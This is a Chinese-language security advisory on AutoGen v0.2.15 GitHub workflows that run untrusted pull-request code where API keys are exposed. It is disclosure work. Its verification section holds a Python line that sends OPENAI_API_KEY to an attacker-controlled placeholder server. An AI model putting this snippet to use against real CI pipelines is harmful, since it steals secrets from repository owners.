# GHSL-2024-025_GHSL-2024-026: GitHub Pull Request可能泄露API密钥

## 概述

在某些GitHub工作流中，当触发一个Pull Request时，可能会泄露秘密的API密钥（例如OpenAI、Azure、Bing等）。

## 技术背景

- **AutoGen版本**：v0.2.15
- **漏洞来源**：
  - 使用`pull_request_target`事件的工作流程会检出来自Pull Request的不可信代码并运行。
  - 这种做法允许攻击者通过创建一个包含恶意脚本的Pull Request，来访问保存于环境变量中的秘密信息（如`OPENAI_API_KEY`、`AZURE_OPENAI_API_KEY`等）。

## 漏洞细节

1. **检出不可信代码**：当工作流运行时，它会检查并执行来自分叉的测试脚本，这种不可信的代码会在能够访问秘密的环境中运行。
2. **访问秘密的示例**：攻击者可以创建恶意文件，如`test/test_qdrant_retrievechat.py`，以获取环境变量中的秘密。
3. **其他受影响步骤**：除了RetrieveChatTest.Coverage步骤外，该工作流中的其他步骤也存在相同的漏洞。

## 验证漏洞

尽管工作流没有写权限（不能修改基础仓库），攻击者仍然可以通过以下方式获取环境中的密钥：

```python
import urllib.request
import os

urllib.request.urlopen(f"https://YOUR-CONTROLLED-SERVER?{os.environ['OPENAI_API_KEY']}")
```

## 发现和报告

这一问题是由GHSL团队成员@pwntester（Alvaro Muñoz）发现并报告的。如需联系GHSL团队，请发送邮件至securitylab@github.com，并在邮件中包含GHSL-2024-025或GHSL-2024-026的参考信息以供后续沟通。